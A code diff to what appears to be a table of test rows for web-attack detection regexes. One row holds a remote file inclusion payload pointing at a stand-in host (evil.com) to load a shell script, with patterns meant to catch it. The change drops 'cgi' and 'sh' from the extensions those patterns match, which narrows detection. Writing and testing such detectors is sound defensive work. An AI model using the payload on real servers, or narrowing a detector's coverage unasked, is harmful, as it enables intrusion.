@@ -105,10 +105,10 @@ ROWS: list[dict[str, object]] = [
         "category": "file_inclusion",
         "payload": b"=http://evil.com/a/b/shell.php",
         "current": r"=(?:https?|ftp):\/\/[^\s'\"<>]+\/[^\s'\"<>\/]*"
-        r"\.(?:phtml|php[3-5]?|phar|jsp|aspx?|cgi|pl|py|sh|txt|inc)"
+        r"\.(?:phtml|php[3-5]?|phar|jsp|aspx?|pl|py|txt|inc)"
         r"(?![a-zA-Z0-9])",
         "naive_fix": r"=(?:https?|ftp):\/\/[^\s'\"<>\/]+\/[^\s'\"<>\/]*"
-        r"\.(?:phtml|php[3-5]?|phar|jsp|aspx?|cgi|pl|py|sh|txt|inc)"
+        r"\.(?:phtml|php[3-5]?|phar|jsp|aspx?|pl|py|txt|inc)"
         r"(?![a-zA-Z0-9])",
         "grammar": "RFC 3986 3.3: path-abempty = *( '/' segment ), so a URI "
         "path is by definition multi-segment; an RFI target with an "
